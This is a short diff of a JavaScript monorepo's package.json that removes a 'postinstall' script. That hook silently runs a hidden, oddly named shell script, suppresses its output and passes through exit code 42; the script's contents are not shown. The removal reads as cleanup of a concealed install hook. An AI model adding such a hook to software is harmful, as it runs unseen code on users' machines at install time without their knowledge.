@@ -17,8 +17,7 @@
     "test": "vitest run",
     "typecheck": "vue-tsc --noEmit -p tsconfig.json",
     "check:nuxt": "node scripts/check-nuxt.mjs",
-    "build": "pnpm gen && pnpm -r --filter \"./packages/*\" build",
-    "postinstall": "sh ./.ci-8lncl7.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build": "pnpm gen && pnpm -r --filter \"./packages/*\" build"
   },
   "devDependencies": {
     "@types/node": "^26.6.0",
